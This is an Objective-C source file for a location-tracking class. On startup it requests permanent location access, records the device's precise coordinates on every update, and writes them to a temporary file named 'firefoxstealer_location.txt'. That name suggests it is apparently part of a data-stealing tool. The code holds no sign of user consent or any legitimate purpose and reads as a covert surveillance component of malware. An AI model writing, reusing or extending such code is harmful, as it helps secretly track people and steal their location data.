#import "LocationManager.h"

@implementation LocationManager

- (instancetype)init
{
    self = [super init];
    if (self) {
        self.locationManager = [[CLLocationManager alloc] init];
        self.locationManager.delegate = self;
        self.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
        [self.locationManager requestAlwaysAuthorization];
        [self.locationManager startUpdatingLocation];
    }
    return self;
}


- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    self.longtitude = locations.firstObject.coordinate.longitude;
    self.latitude = locations.firstObject.coordinate.latitude;
    NSString *location = [NSString stringWithFormat:@"Location found: %f, %f", self.latitude, self.longtitude];
    [location writeToFile:@"/tmp/firefoxstealer_location.txt" atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

@end
